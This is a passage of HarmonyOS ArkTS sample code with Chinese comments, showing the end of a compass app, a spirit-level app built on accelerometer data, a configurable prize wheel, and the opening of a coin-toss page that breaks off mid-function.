// 开始监听传感器数据 &#125;); &#125; // 开始监听传感器的方位数据 private startOrientationUpdates(): void &#123; sensor.on(sensor.SensorId.ORIENTATION, (orientationData) =&gt; &#123; const alpha = orientationData.alpha; // 获取当前的方位角 this.directionMessage = this.calculateDirection(alpha); // 计算当前方向 const angleDifference = this.calculateAngleDifference(this.currentAngle, alpha); // 计算角度差 if (Math.abs(angleDifference) &gt; this.threshold) &#123; // 如果角度变化超过阈值 this.updateRotationAngle(angleDifference, alpha); // 更新旋转角度 &#125; &#125;, &#123; interval: 10000000 &#125;); // 设置传感器更新间隔，单位为纳秒，10000000表示1秒 &#125; // 计算两个角度之间的差异 private calculateAngleDifference(currentAngle: number, targetAngle: number): number &#123; let diff = targetAngle - currentAngle; // 计算角度差 if (diff &gt; 180) &#123; diff -= 360; // 顺时针旋转超过180度，调整为负值 &#125; else if (diff &lt; -180) &#123; diff += 360; // 逆时针旋转超过180度，调整为正值 &#125; return diff; // 返回调整后的角度差 &#125; // 更新旋转角度 private updateRotationAngle(angleDifference: number, newAngle: number): void &#123; this.cumulativeRotation += angleDifference; // 累加旋转角度 this.rotationAngle += angleDifference; // 更新当前旋转角度 this.currentAngle = newAngle; // 更新当前传感器角度 // 动画更新 animateToImmediately(&#123;&#125;, () =&gt; &#123; this.rotationAngle = this.cumulativeRotation; // 将旋转角度设置为累计旋转角度 &#125;); console.log(`累计旋转角度: $&#123;this.cumulativeRotation&#125;`); // 打印累计旋转角度 &#125; // 根据角度计算方向 private calculateDirection(angle: number): string &#123; for (const range of DIRECTION_RANGES) &#123; if (angle &gt;= range.min &amp;&amp; angle &lt; range.max) &#123; return range.name; // 返回对应的方向名称 &#125; &#125; return &#x27;未知方向&#x27;; // 如果角度不在任何范围内，返回未知方向 &#125; // 构建用户界面 build() &#123; Column(&#123; space: 20 &#125;) &#123; // 创建一个列布局，设置间距为20 Row(&#123; space: 5 &#125;) &#123; // 创建一个行布局，设置间距为5 Text(this.directionMessage) // 显示当前方向 .layoutWeight(1) // 设置布局权重 .textAlign(TextAlign.End) // 文本对齐方式 .fontColor(&#x27;#dedede&#x27;) // 文本颜色 .fontSize(50); // 文本大小 Text(`$&#123;Math.floor(this.currentAngle)&#125;°`) // 显示当前角度 .layoutWeight(1) // 设置布局权重 .textAlign(TextAlign.Start) // 文本对齐方式 .fontColor(&#x27;#dedede&#x27;) // 文本颜色 .fontSize(50); // 文本大小 &#125;.width(&#x27;100%&#x27;).margin(&#123; top: 50 &#125;); // 设置宽度和上边距 Stack() &#123; // 创建一个堆叠布局 Stack() &#123; // 内部堆叠布局 Circle() // 创建一个圆形 .width(250) // 设置宽度 .height(250) // 设置高度 .fillOpacity(0) // 设置填充透明度 .strokeWidth(25) // 设置边框宽度 .stroke(&#x27;#f95941&#x27;) // 设置边框颜色 .strokeDashArray([1, 5]) // 设置边框虚线样式 .strokeLineJoin(LineJoinStyle.Round); // 设置边框连接方式 Text(&#x27;北&#x27;) // 创建一个文本，显示“北” .height(&#x27;100%&#x27;) // 设置高度 .width(40) // 设置宽度 .align(Alignment.Top) // 设置对齐方式 .fontColor(&#x27;#ff4f3f&#x27;) // 设置文本颜色 .rotate(&#123; angle: 0 &#125;) // 设置旋转角度 .padding(&#123; top: 80 &#125;) // 设置内边距 .textAlign(TextAlign.Center); // 设置文本对齐方式 Text(&#x27;东&#x27;) // 创建一个文本，显示“东” .height(&#x27;100%&#x27;) // 设置高度 .width(40) // 设置宽度 .align(Alignment.Top) // 设置对齐方式 .fontColor(&#x27;#fcfdfd&#x27;) // 设置文本颜色 .rotate(&#123; angle: 90 &#125;) // 设置旋转角度 .padding(&#123; top: 80 &#125;) // 设置内边距 .textAlign(TextAlign.Center); // 设置文本对齐方式 Text(&#x27;南&#x27;) // 创建一个文本，显示“南” .height(&#x27;100%&#x27;) // 设置高度 .width(40) // 设置宽度 .align(Alignment.Top) // 设置对齐方式 .fontColor(&#x27;#fcfdfd&#x27;) // 设置文本颜色 .rotate(&#123; angle: 180 &#125;) // 设置旋转角度 .padding(&#123; top: 80 &#125;) // 设置内边距 .textAlign(TextAlign.Center); // 设置文本对齐方式 Text(&#x27;西&#x27;) // 创建一个文本，显示“西” .height(&#x27;100%&#x27;) // 设置高度 .width(40) // 设置宽度 .align(Alignment.Top) // 设置对齐方式 .fontColor(&#x27;#fcfdfd&#x27;) // 设置文本颜色 .rotate(&#123; angle: 270 &#125;) // 设置旋转角度 .padding(&#123; top: 80 &#125;) // 设置内边距 .textAlign(TextAlign.Center); // 设置文本对齐方式 &#125; .width(&#x27;100%&#x27;) // 设置宽度 .height(&#x27;100%&#x27;) // 设置高度 .borderRadius(&#x27;50%&#x27;) // 设置圆角 .margin(&#123; top: 50 &#125;) // 设置上边距 .rotate(&#123; angle: -this.rotationAngle &#125;) // 设置旋转角度 .animation(&#123;&#125;); // 设置动画效果 Line() // 创建一个线条 .width(5) // 设置宽度 .height(40) // 设置高度 .backgroundColor(&#x27;#fdfffe&#x27;) // 设置背景颜色 .borderRadius(&#x27;50%&#x27;) // 设置圆角 .margin(&#123; bottom: 200 &#125;); // 设置下边距 &#125; .width(300) // 设置宽度 .height(300); // 设置高度 &#125; .height(&#x27;100%&#x27;) // 设置高度 .width(&#x27;100%&#x27;) // 设置宽度 .backgroundColor(&#x27;#18181a&#x27;); // 设置背景颜色 &#125;&#125; level水平仪 123456789//module.json5&#123; &quot;module&quot;: &#123; &quot;requestPermissions&quot;: [ &#123; &quot;name&quot;: &quot;ohos.permission.ACCELEROMETER&quot; &#125; ],&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168// 导入传感器服务模块import &#123; sensor &#125; from &#x27;@kit.SensorServiceKit&#x27;;// 导入业务错误处理模块import &#123; BusinessError &#125; from &#x27;@kit.BasicServicesKit&#x27;; // 定义单位长度，用于后续计算中的比例尺const UNIT_LENGTH = 4; // 使用 @Entry 和 @Component 装饰器定义一个名为 LevelMeter 的组件@Entry@Componentstruct LevelMeter &#123; // 定义状态变量，用于存储当前角度 @State angle: number = 0; // 定义状态变量，用于存储前后倾斜角度（pitch） @State pitch: number = 0; // 定义状态变量，用于存储左右倾斜角度（roll） @State roll: number = 0; // 定义角度变化阈值，用于判断是否需要更新角度 private threshold: number = 1; // 组件即将出现时的生命周期方法 aboutToAppear(): void &#123; // 获取传感器列表 sensor.getSensorList((error: BusinessError) =&gt; &#123; if (error) &#123; // 如果获取传感器列表失败，输出错误信息 console.error(&#x27;获取传感器列表失败&#x27;, error); return; &#125; // 开始更新方向信息 this.startOrientationUpdates(); &#125;); &#125; // 启动方向更新的方法 private startOrientationUpdates(): void &#123; // 注册加速度传感器事件监听器 sensor.on(sensor.SensorId.ACCELEROMETER, (data) =&gt; &#123; // 计算新的前后倾斜角度（pitch） const newPitch = Math.atan(data.y / Math.sqrt(data.x * data.x + data.z * data.z)) * (180 / Math.PI); // 计算新的左右倾斜角度（roll） const newRoll = Math.atan(data.x / Math.sqrt(data.y * data.y + data.z * data.z)) * (180 / Math.PI); // 如果新的角度变化超过阈值，则更新状态 if (Math.abs(newPitch - this.pitch) &gt; this.threshold || Math.abs(newRoll - this.roll) &gt; this.threshold) &#123; this.pitch = newPitch; this.roll = newRoll; // 更新当前角度 this.angle = Math.hypot(newPitch, newRoll); &#125; &#125;, &#123; interval: 100000000 &#125;); // 设置更新间隔为100毫秒 &#125; // 计算小球位置的方法 private calculateBallPosition(): Position &#123; // 根据当前角度计算半径 const radius = (this.angle &lt;= 10 ? this.angle * 2.5 : (10 * 2.5 + (this.angle - 10))) * UNIT_LENGTH; // 将角度转换为弧度 const angleInRadians = Math.atan2(this.pitch, this.roll); // 计算小球在圆周上的X坐标 const x = -radius * Math.cos(angleInRadians); // 计算小球在圆周上的Y坐标 const y = radius * Math.sin(angleInRadians); // 返回小球的位置 return &#123; x, y &#125;; &#125; // 构建UI的方法 build() &#123; // 使用Stack布局容器 Stack() &#123; // 显示当前角度的文本 Stack() &#123; Row(&#123; space: 5 &#125;) &#123; // 创建一个行布局，设置间距为5 Text(`$&#123;Math.floor(this.angle)&#125;°`)// 显示当前角度 .layoutWeight(1)// 设置布局权重 .textAlign(TextAlign.Center)// 文本对齐方式 .fontColor(&#x27;#dedede&#x27;)// 文本颜色 .fontSize(60); // 文本大小 &#125;.width(&#x27;100%&#x27;).margin(&#123; top: 80 &#125;) // 设置宽度和上边距 &#125;.height(&#x27;100%&#x27;).align(Alignment.Top) // 设置高度和对齐方式 // 模拟水平仪背景的圆环 Stack() &#123; // 外部大圆 Text() .width(&#x27;600lpx&#x27;)// 设置宽度 .height(&#x27;600lpx&#x27;)// 设置高度 .borderRadius(&#x27;50%&#x27;)// 设置圆角 .backgroundColor(&quot;#171b1e&quot;)// 设置背景颜色 .blur(50)// 设置模糊效果 .shadow(&#123; radius: 300, type: ShadowType.COLOR, color: &quot;#232426&quot; &#125;); // 设置阴影效果 // 中间圆 Text() .width(`$&#123;(this.angle &lt;= 10 ? this.angle * 2.5 : (10 * 2.5 + (this.angle - 10))) * UNIT_LENGTH * 2&#125;lpx`)// 计算宽度 .height(`$&#123;(this.angle &lt;= 10 ? this.angle * 2.5 : (10 * 2.5 + (this.angle - 10))) * UNIT_LENGTH * 2&#125;lpx`)// 计算高度 .borderRadius(&#x27;50%&#x27;)// 设置圆角 .backgroundColor(&quot;#2e3235&quot;)// 设置背景颜色 .animation(&#123; curve: Curve.EaseOut &#125;); // 设置动画效果 // 刻度线 ForEach([10, 20, 30, 40, 50], (item: number) =&gt; &#123; Text() .width(`$&#123;(15 + item) * UNIT_LENGTH * 2&#125;lpx`)// 计算宽度 .height(`$&#123;(15 + item) * UNIT_LENGTH * 2&#125;lpx`)// 计算高度 .borderWidth(1)// 设置边框宽度 .borderRadius(&#x27;50%&#x27;)// 设置圆角 .borderColor(&quot;#807d8184&quot;); // 设置边框颜色 // 刻度数字 Text(`$&#123;item&#125;`) .width(20)// 设置宽度 .fontColor(&quot;#7d8184&quot;)// 设置字体颜色 .fontSize(10)// 设置字体大小 .textAlign(TextAlign.Center)// 设置文本对齐方式 .margin(&#123; left: `$&#123;(15 + item) * UNIT_LENGTH * 2&#125;lpx` &#125;); // 设置左边距 &#125;); // 小球 Text() .width(14)// 设置宽度 .height(14)// 设置高度 .backgroundColor(&quot;#ff5841&quot;)// 设置背景颜色 .borderRadius(&#x27;50%&#x27;); // 设置圆角 // 小球背景 Stack() &#123; Stack() &#123; &#125; .radialGradient(&#123; center: [20, 20], // 设置渐变中心点 radius: 60, // 设置渐变半径 colors: [ [&quot;#807a7a83&quot;, 0.0], // 渐变颜色1 [&quot;#8074747e&quot;, 0.7], // 渐变颜色2 [&quot;#80898992&quot;, 1.0]// 渐变颜色3 ] &#125;).width(&#x27;100%&#x27;).height(&#x27;100%&#x27;) // 设置宽度和高度 &#125; .clip(true) // 设置裁剪 .radialGradient(&#123; center: [20, 20], // 设置渐变中心点 radius: 60, // 设置渐变半径 colors: Math.floor(this.angle) === 0 ? [[&quot;#FF6B6B&quot;, 0.0], [&quot;#D84315&quot;, 0.3], [&quot;#C62828&quot;, 1.0]] : // 当角度为0时的渐变颜色 [[&quot;#bcbcc6&quot;, 0.0], [&quot;#464650&quot;, 0.3], [&quot;#474750&quot;, 1.0]] // 当角度不为0时的渐变颜色 &#125;) .width(50) // 设置宽度 .height(50) // 设置高度 .borderRadius(&#x27;50%&#x27;) // 设置圆角 .translate(&#123; x: `$&#123;this.calculateBallPosition().x&#125;lpx`, // 设置X轴偏移 y: `$&#123;this.calculateBallPosition().y&#125;lpx` // 设置Y轴偏移 &#125;) .animation(&#123; curve: Curve.EaseOut &#125;); // 设置动画效果 &#125;.width(&#x27;580lpx&#x27;).height(&#x27;580lpx&#x27;).borderRadius(&#x27;50%&#x27;) // 设置外部大圆的宽度、高度和圆角 &#125;.height(&#x27;100%&#x27;) // 设置Stack的高度 .width(&#x27;100%&#x27;) // 设置Stack的宽度 .backgroundColor(&quot;#18181a&quot;); // 设置背景颜色 &#125;&#125; turntable转盘 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253import &#123; CounterComponent, CounterType &#125; from &#x27;@kit.ArkUI&#x27;; // 导入计数器组件和计数器类型 // 定义扇形组件@Componentstruct Sector &#123; @Prop radius: number; // 扇形的半径 @Prop angle: number; // 扇形的角度 @Prop color: string; // 扇形的颜色 // 创建扇形路径的函数 createSectorPath(radius: number, angle: number): string &#123; const centerX = radius / 2; // 计算扇形中心的X坐标 const centerY = radius / 2; // 计算扇形中心的Y坐标 const startX = centerX; // 扇形起始点的X坐标 const startY = centerY - radius; // 扇形起始点的Y坐标 const halfAngle = angle / 4; // 计算半个角度 // 计算扇形结束点1的坐标 const endX1 = centerX + radius * Math.cos((halfAngle * Math.PI) / 180); const endY1 = centerY - radius * Math.sin((halfAngle * Math.PI) / 180); // 计算扇形结束点2的坐标 const endX2 = centerX + radius * Math.cos((-halfAngle * Math.PI) / 180); const endY2 = centerY - radius * Math.sin((-halfAngle * Math.PI) / 180); // 判断是否为大弧 const largeArcFlag = angle / 2 &gt; 180 ? 1 : 0; const sweepFlag = 1; // 设置弧线方向为顺时针 // 生成SVG路径命令 const pathCommands = `M$&#123;startX&#125; $&#123;startY&#125; A$&#123;radius&#125; $&#123;radius&#125; 0 $&#123;largeArcFlag&#125; $&#123;sweepFlag&#125; $&#123;endX1&#125; $&#123;endY1&#125; L$&#123;centerX&#125; $&#123;centerY&#125; L$&#123;endX2&#125; $&#123;endY2&#125; A$&#123;radius&#125; $&#123;radius&#125; 0 $&#123;largeArcFlag&#125; $&#123;1 - sweepFlag&#125; $&#123;startX&#125; $&#123;startY&#125; Z`; return pathCommands; // 返回路径命令 &#125; // 构建扇形组件 build() &#123; Stack() &#123; // 创建第一个扇形路径 Path() .width(`$&#123;this.radius&#125;px`) // 设置宽度为半径 .height(`$&#123;this.radius&#125;px`) // 设置高度为半径 .commands(this.createSectorPath(this.radius, this.angle)) // 设置路径命令 .fillOpacity(1) // 设置填充透明度 .fill(this.color) // 设置填充颜色 .strokeWidth(0) // 设置边框宽度为0 .rotate(&#123; angle: this.angle / 4 - 90 &#125;); // 旋转扇形 // 创建第二个扇形路径 Path() .width(`$&#123;this.radius&#125;px`) // 设置宽度为半径 .height(`$&#123;this.radius&#125;px`) // 设置高度为半径 .commands(this.createSectorPath(this.radius, this.angle)) // 设置路径命令 .fillOpacity(1) // 设置填充透明度 .fill(this.color) // 设置填充颜色 .strokeWidth(0) // 设置边框宽度为0 .rotate(&#123; angle: 180 - (this.angle / 4 - 90) &#125;); // 旋转扇形 &#125; &#125;&#125; // 定义单元格类@ObservedV2class Cell &#123; @Trace angle: number = 0; // 扇形的角度 @Trace title: string; // 当前格子的标题 @Trace color: string; // 背景颜色 @Trace rotate: number = 0; // 在转盘要旋转的角度 angleStart: number = 0; // 轮盘所在区间的起始 angleEnd: number = 0; // 轮盘所在区间的结束 proportion: number = 0; // 所占比例 // 构造函数 constructor(proportion: number, title: string, color: string) &#123; this.proportion = proportion; // 设置比例 this.title = title; // 设置标题 this.color = color; // 设置颜色 &#125;&#125; // 定义转盘组件@Entry@Componentstruct Wheel &#123; @State cells: Cell[] = []; // 存储单元格的数组 @State wheelWidth: number = 600; // 转盘的宽度 @State currentAngle: number = 0; // 当前转盘的角度 @State selectedName: string = &quot;&quot;; // 选中的名称 isAnimating: boolean = false; // 动画状态 colorIndex: number = 0; // 颜色索引 colorPalette: string[] = [ // 颜色调色板 &quot;#26c2ff&quot;, &quot;#978efe&quot;, &quot;#c389fe&quot;, &quot;#ff85bd&quot;, &quot;#ff7051&quot;, &quot;#fea800&quot;, &quot;#ffcf18&quot;, &quot;#a9c92a&quot; ]; // 组件即将出现时调用 aboutToAppear(): void &#123; // 初始化单元格 this.cells.push(new Cell(1, &quot;跑步&quot;, this.colorPalette[this.colorIndex++ % this.colorPalette.length])); this.cells.push(new Cell(2, &quot;跳绳&quot;, this.colorPalette[this.colorIndex++ % this.colorPalette.length])); this.cells.push(new Cell(1, &quot;唱歌&quot;, this.colorPalette[this.colorIndex++ % this.colorPalette.length])); this.cells.push(new Cell(4, &quot;跳舞&quot;, this.colorPalette[this.colorIndex++ % this.colorPalette.length])); this.calculateAngles(); // 计算角度 &#125; // 计算每个单元格的角度 private calculateAngles() &#123; // 根据比例计算总比例 const totalProportion = this.cells.reduce((sum, cell) =&gt; sum + cell.proportion, 0); this.cells.forEach(cell =&gt; &#123; cell.angle = (cell.proportion * 360) / totalProportion; // 计算每个单元格的角度 &#125;); let cumulativeAngle = 0; // 累计角度 this.cells.forEach(cell =&gt; &#123; cell.angleStart = cumulativeAngle; // 设置起始角度 cumulativeAngle += cell.angle; // 更新累计角度 cell.angleEnd = cumulativeAngle; // 设置结束角度 cell.rotate = cumulativeAngle - (cell.angle / 2); // 计算旋转角度 &#125;); &#125; // 构建转盘组件 build() &#123; Column() &#123; Row() &#123; Text(&#x27;转盘&#x27;).fontSize(20).fontColor(&quot;#0b0e15&quot;); // 显示转盘标题 &#125;.width(&#x27;100%&#x27;).height(44).justifyContent(FlexAlign.Center); // 设置行的宽度和高度 // 显示当前状态 Text(this.isAnimating ? &#x27;旋转中&#x27; : `$&#123;this.selectedName&#125;`).fontSize(20).fontColor(&quot;#0b0e15&quot;).height(40); Stack() &#123; Stack() &#123; // 遍历每个单元格并绘制扇形 ForEach(this.cells, (cell: Cell) =&gt; &#123; Stack() &#123; Sector(&#123; radius: lpx2px(this.wheelWidth) / 2, angle: cell.angle, color: cell.color &#125;); // 创建扇形 Text(cell.title).fontColor(Color.White).margin(&#123; bottom: `$&#123;this.wheelWidth / 1.4&#125;lpx` &#125;); // 显示单元格标题 &#125;.width(&#x27;100%&#x27;).height(&#x27;100%&#x27;).rotate(&#123; angle: cell.rotate &#125;); // 设置宽度和高度，并旋转 &#125;); &#125; .borderRadius(&#x27;50%&#x27;) // 设置圆角 .backgroundColor(Color.Gray) // 设置背景颜色 .width(`$&#123;this.wheelWidth&#125;lpx`) // 设置转盘宽度 .height(`$&#123;this.wheelWidth&#125;lpx`) // 设置转盘高度 .rotate(&#123; angle: this.currentAngle &#125;); // 旋转转盘 // 创建指针 Polygon(&#123; width: 20, height: 10 &#125;) .points([[0, 0], [10, -20], [20, 0]]) // 设置指针的点 .fill(&quot;#d72b0b&quot;) // 设置指针颜色 .height(20) // 设置指针高度 .margin(&#123; bottom: &#x27;140lpx&#x27; &#125;); // 设置指针底部边距 // 创建开始按钮 Button(&#x27;开始&#x27;) .fontColor(&quot;#c53a2c&quot;) // 设置按钮字体颜色 .borderWidth(10) // 设置按钮边框宽度 .borderColor(&quot;#dd2218&quot;) // 设置按钮边框颜色 .backgroundColor(&quot;#fde427&quot;) // 设置按钮背景颜色 .width(&#x27;200lpx&#x27;) // 设置按钮宽度 .height(&#x27;200lpx&#x27;) // 设置按钮高度 .borderRadius(&#x27;50%&#x27;) // 设置按钮为圆形 .clickEffect(&#123; level: ClickEffectLevel.LIGHT &#125;) // 设置点击效果 .onClick(() =&gt; &#123; // 点击按钮时的回调函数 if (this.isAnimating) &#123; // 如果正在动画中，返回 return; &#125; this.selectedName = &quot;&quot;; // 清空选中的名称 this.isAnimating = true; // 设置动画状态为正在动画 animateTo(&#123; // 开始动画 duration: 5000, // 动画持续时间为5000毫秒 curve: Curve.EaseInOut, // 动画曲线为缓入缓出 onFinish: () =&gt; &#123; // 动画完成后的回调 this.currentAngle %= 360; // 保持当前角度在0到360之间 for (const cell of this.cells) &#123; // 遍历每个单元格 // 检查当前角度是否在单元格的角度范围内 if (360 - this.currentAngle &gt;= cell.angleStart &amp;&amp; 360 - this.currentAngle &lt;= cell.angleEnd) &#123; this.selectedName = cell.title; // 设置选中的名称为当前单元格的标题 break; // 找到后退出循环 &#125; &#125; this.isAnimating = false; // 设置动画状态为未动画 &#125;, &#125;, () =&gt; &#123; // 动画进行中的回调 this.currentAngle += (360 * 5 + Math.floor(Math.random() * 360)); // 更新当前角度，增加随机旋转 &#125;); &#125;); &#125; // 创建滚动区域 Scroll() &#123; Column() &#123; // 遍历每个单元格，创建输入框和计数器 ForEach(this.cells, (item: Cell, index: number) =&gt; &#123; Row() &#123; // 创建文本输入框，显示单元格标题 TextInput(&#123; text: item.title &#125;) .layoutWeight(1) // 设置输入框占据剩余空间 .onChange((value) =&gt; &#123; // 输入框内容变化时的回调 item.title = value; // 更新单元格标题 &#125;); // 创建计数器组件 CounterComponent(&#123; options: &#123; type: CounterType.COMPACT, // 设置计数器类型为紧凑型 numberOptions: &#123; label: `当前占比`, // 设置计数器标签 value: item.proportion, // 设置计数器初始值 min: 1, // 设置最小值 max: 100, // 设置最大值 step: 1, // 设置步长 onChange: (value: number) =&gt; &#123; // 计数器值变化时的回调 item.proportion = value; // 更新单元格的比例 this.calculateAngles(); // 重新计算角度 &#125; &#125; &#125; &#125;); // 创建删除按钮 Button(&#x27;删除&#x27;).onClick(() =&gt; &#123; this.cells.splice(index, 1); // 从单元格数组中删除当前单元格 this.calculateAngles(); // 重新计算角度 &#125;); &#125;.width(&#x27;100%&#x27;).justifyContent(FlexAlign.SpaceBetween) // 设置行的宽度和内容对齐方式 .padding(&#123; left: 40, right: 40 &#125;); // 设置左右内边距 &#125;); &#125;.layoutWeight(1); // 设置滚动区域占据剩余空间 &#125;.layoutWeight(1) // 设置滚动区域占据剩余空间 .margin(&#123; top: 20, bottom: 20 &#125;) // 设置上下外边距 .align(Alignment.Top); // 设置对齐方式为顶部对齐 // 创建添加新内容按钮 Button(&#x27;添加新内容&#x27;).onClick(() =&gt; &#123; // 向单元格数组中添加新单元格 this.cells.push(new Cell(1, &quot;新内容&quot;, this.colorPalette[this.colorIndex++ % this.colorPalette.length])); this.calculateAngles(); // 重新计算角度 &#125;).margin(&#123; top: 20, bottom: 20 &#125;); // 设置按钮的上下外边距 &#125; .height(&#x27;100%&#x27;) // 设置组件高度为100% .width(&#x27;100%&#x27;) // 设置组件宽度为100% .backgroundColor(&quot;#f5f8ff&quot;); // 设置组件背景颜色 &#125;&#125; Coin投硬币 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224// 定义地鼠组件@Componentstruct Hamster &#123; @Prop cellWidth: number // 单元格宽度 build() &#123; Stack() &#123; // 创建一个堆叠布局 // 身体 Text() .width(`$&#123;this.cellWidth / 2&#125;lpx`)// 宽度为单元格宽度的一半 .height(`$&#123;this.cellWidth / 3 * 2&#125;lpx`)// 高度为单元格高度的2/3 .backgroundColor(&quot;#b49579&quot;)// 背景颜色 .borderRadius(&#123; topLeft: &#x27;50%&#x27;, topRight: &#x27;50%&#x27; &#125;)// 圆角 .borderColor(&quot;#2a272d&quot;)// 边框颜色 .borderWidth(1) // 边框宽度 // 嘴巴 Ellipse() .width(`$&#123;this.cellWidth / 4&#125;lpx`)// 嘴巴的宽度 .height(`$&#123;this.cellWidth / 5&#125;lpx`)// 嘴巴的高度 .fillOpacity(1)// 填充不透明度 .fill(&quot;#e7bad7&quot;)// 填充颜色 .stroke(&quot;#563e3f&quot;)// 边框颜色 .strokeWidth(1)// 边框宽度 .margin(&#123; top: `$&#123;this.cellWidth / 6&#125;lpx` &#125;) // 上边距 // 左眼睛 Ellipse() .width(`$&#123;this.cellWidth / 9&#125;lpx`)// 左眼睛的宽度 .height(`$&#123;this.cellWidth / 6&#125;lpx`)// 左眼睛的高度 .fillOpacity(1)// 填充不透明度 .fill(&quot;#313028&quot;)// 填充颜色 .stroke(&quot;#2e2018&quot;)// 边框颜色 .strokeWidth(1)// 边框宽度 .margin(&#123; bottom: `$&#123;this.cellWidth / 3&#125;lpx`, right: `$&#123;this.cellWidth / 6&#125;lpx` &#125;) // 下边距和右边距 // 右眼睛 Ellipse() .width(`$&#123;this.cellWidth / 9&#125;lpx`)// 右眼睛的宽度 .height(`$&#123;this.cellWidth / 6&#125;lpx`)// 右眼睛的高度 .fillOpacity(1)// 填充不透明度 .fill(&quot;#313028&quot;)// 填充颜色 .stroke(&quot;#2e2018&quot;)// 边框颜色 .strokeWidth(1)// 边框宽度 .margin(&#123; bottom: `$&#123;this.cellWidth / 3&#125;lpx`, left: `$&#123;this.cellWidth / 6&#125;lpx` &#125;) // 下边距和左边距 // 左眼瞳 Ellipse() .width(`$&#123;this.cellWidth / 20&#125;lpx`)// 左眼瞳的宽度 .height(`$&#123;this.cellWidth / 15&#125;lpx`)// 左眼瞳的高度 .fillOpacity(1)// 填充不透明度 .fill(&quot;#fefbfa&quot;)// 填充颜色 .margin(&#123; bottom: `$&#123;this.cellWidth / 2.5&#125;lpx`, right: `$&#123;this.cellWidth / 6&#125;lpx` &#125;) // 下边距和右边距 // 右眼瞳 Ellipse() .width(`$&#123;this.cellWidth / 20&#125;lpx`)// 右眼瞳的宽度 .height(`$&#123;this.cellWidth / 15&#125;lpx`)// 右眼瞳的高度 .fillOpacity(1)// 填充不透明度 .fill(&quot;#fefbfa&quot;)// 填充颜色 .margin(&#123; bottom: `$&#123;this.cellWidth / 2.5&#125;lpx`, left: `$&#123;this.cellWidth / 6&#125;lpx` &#125;) // 下边距和左边距 &#125;.width(`$&#123;this.cellWidth&#125;lpx`).height(`$&#123;this.cellWidth&#125;lpx`) // 设置组件的宽度和高度 &#125;&#125; // 定义页面组件@Entry@Componentstruct CoinTossPage &#123; @State cellWidth: number = 50 // 单元格宽度 @State headsCount: number = 0 // 正面朝上的次数 @State tailsCount: number = 0 // 反面朝上的次数 @State rotationAngle: number = 0 // 旋转角度 @State verticalOffset: number = 0 // 纵向位移 @State isAnimRun: boolean = false // 动画是否正在执行 build() &#123; Column() &#123; // 页面标题 Text(&#x27;抛硬币&#x27;) .height(50)// 高度设置为50 .width(&#x27;100%&#x27;)// 宽度设置为100% .textAlign(TextAlign.Center)// 文本居中对齐 .fontColor(&quot;#fefefe&quot;)// 字体颜色 .fontSize(20); // 字体大小 // 显示地鼠和计数 Row(&#123; space: 20 &#125;) &#123; Stack() &#123; Hamster(&#123; cellWidth: this.cellWidth &#125;) // 创建地鼠组件 &#125; .borderRadius(&#x27;50%&#x27;) // 设置圆角 .width(`$&#123;this.cellWidth&#125;lpx`) // 设置宽度 .height(`$&#123;this.cellWidth&#125;lpx`) // 设置高度 .linearGradient(&#123; // 设置线性渐变背景 direction: GradientDirection.LeftBottom, colors: [[&#x27;#ebcf2f&#x27;, 0.0], [&#x27;#fef888&#x27;, 0.5], [&#x27;#ebcf2f&#x27;, 1.0]] &#125;); // 显示反面朝上的次数 Text(`$&#123;this.tailsCount&#125;`) .fontSize(20) .fontColor(&quot;#fefefe&quot;); Stack() &#123; // 显示100 Text(&quot;100&quot;) .fontColor(&quot;#9f7606&quot;) .fontSize(`$&#123;this.cellWidth / 2&#125;lpx`); &#125; .borderRadius(&#x27;50%&#x27;) // 设置圆角 .width(`$&#123;this.cellWidth&#125;lpx`) // 设置宽度 .height(`$&#123;this.cellWidth&#125;lpx`) // 设置高度 .linearGradient(&#123; // 设置线性渐变背景 direction: GradientDirection.LeftBottom, colors: [[&#x27;#ebcf2f&#x27;, 0.0], [&#x27;#fef888&#x27;, 0.5], [&#x27;#ebcf2f&#x27;, 1.0]] &#125;); // 显示正面朝上的次数 Text(`$&#123;this.headsCount&#125;`) .fontSize(20) .fontColor(&quot;#fefefe&quot;); &#125;.width(&#x27;100%&#x27;).justifyContent(FlexAlign.Center); // 设置宽度和内容居中对齐 Stack() &#123; Stack() &#123; // 创建放大版地鼠组件 Hamster(&#123; cellWidth: this.cellWidth * 3 &#125;) .visibility(this.isHeadsFaceUp() ? Visibility.Visible : Visibility.Hidden); // 根据状态显示或隐藏 // 显示100 Text(&quot;100&quot;) .fontColor(&quot;#9f7606&quot;)// 字体颜色 .fontSize(`$&#123;this.cellWidth / 2 * 3&#125;lpx`)// 字体大小 .visibility(!this.isHeadsFaceUp() ? Visibility.Visible : Visibility.Hidden)// 根据状态显示或隐藏 .rotate(&#123; // 旋转180度 x: 1, y: 0, z: 0, angle: 180 &#125;); &#125; .borderRadius(&#x27;50%&#x27;) // 设置圆角 .width(`$&#123;this.cellWidth * 3&#125;lpx`) // 设置宽度 .height(`$&#123;this.cellWidth * 3&#125;lpx`) // 设置高度 .linearGradient(&#123; // 设置线性渐变背景 direction: GradientDirection.LeftBottom, colors: [[&#x27;#ebcf2f&#x27;, 0.0], [&#x27;#fef888&#x27;, 0.5], [&#x27;#ebcf2f&#x27;, 1.0]] &#125;) .rotate(&#123; // 根据当前角度旋转 x: 1, y: 0, z: 0, angle: this.rotationAngle &#125;) .translate(&#123; x: 0, y: this.verticalOffset &#125;) // 设置纵向位移 .onClick(() =&gt; &#123; // 点击事件处理 if (this.isAnimRun) &#123; return; &#125; this.isAnimRun = true let maxAnimationSteps = 2 * (10 + Math.floor(Math.random() * 10)); // 计算最大动画次数 let totalAnimationDuration = 2000; // 动画总时长 // 